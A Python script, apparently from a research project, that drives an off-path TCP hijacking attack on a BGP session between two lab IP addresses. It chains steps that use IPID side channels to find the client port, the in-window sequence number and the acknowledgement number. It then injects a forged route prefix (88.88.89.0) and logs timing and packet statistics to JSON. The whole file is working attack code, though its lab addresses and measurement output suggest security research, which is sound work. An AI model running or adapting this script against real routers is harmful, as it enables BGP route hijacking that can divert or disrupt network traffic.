# coding=utf-8

import time
import os
import json

from IPID_HCSC.connetcion_find import Connection_Finder
from IPID_HCSC.seq_find import Seq_Finder
from IPID_HCSC.ack_find import *


if __name__ == '__main__':

    server_ip = '172.21.0.125'
    server_port = 179

    client_ip = '172.21.0.70'

    attack_bind_if = 'eth0'
    own_ip_prefix = '10.10.0.0'
    collision_ip = '10.10.9.185'

    connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                                   block_size=500, num_thread=2, reverse=False,
                                   server_port=server_port, bind_if_name=attack_bind_if)
    connection.run()
    client_port = connection.result

    if client_port == -1:
        print('No Connection Found.')
        exit(1)

    time.sleep(3)
    seq = Seq_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                     server_port=server_port, client_port=client_port,
                     bind_ifname=attack_bind_if, verbose=True, chunk_size=500, num_thread=3)
    seq.run()
    seq_in_win = seq.result

    if seq_in_win == -1:
        print('Seq Find Miss')
        jstr = json.dumps({'res':0})
    else:
        time.sleep(3)
        ack = Ack_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                         server_port=server_port, client_port=client_port, seq_in_win=seq_in_win,
                         bind_if_name=attack_bind_if)

        ack.run_attack_bgp()
        seq_num = ack.seq_num
        ack_num = ack.ack_in_win
        attack_action_bgp(client_ip=client_ip, server_ip=server_ip, client_port=client_port, inject='88.88.89.0',
                          server_port=server_port, seq=seq_num, ack=ack_num, ifname=attack_bind_if)

        print('------ Total Statistics ------')
        print('Time: ' + str(connection.cost_time + seq.cost_time + ack.cost_time) + ' (s)')
        print('Packets: ' + str(connection.send_n + seq.send_n + ack.send_n))
        print('Bytes: ' + str(connection.send_byte + seq.send_byte + ack.send_byte) + ' (bytes)')
        res_d = {}
        res_d['res'] = 1
        res_d['connection'] = {'time': connection.cost_time, 'send_n': connection.send_n, 'send_byte': connection.send_byte}
        res_d['seq'] = {'time': seq.cost_time, 'send_n': seq.send_n, 'send_byte': seq.send_byte}
        res_d['ack'] = {'time': ack.cost_time, 'send_n': ack.send_n, 'send_byte': ack.send_byte,
                        'time1': ack.time1, 'send_n1': ack.send_n1, 'send_byte1': ack.send_byte1,
                        'time2': ack.time2, 'send_n2': ack.send_n2, 'send_byte2': ack.send_byte2}
        jstr = json.dumps(res_d)

    path = './bgp_res'
    if not os.path.exists(path):
        os.makedirs(path)

    filelist = os.listdir(path)

    with open(path + '/bgp_res_' + str(len(filelist))+ '.json', 'w') as f:
        f.write(jstr)

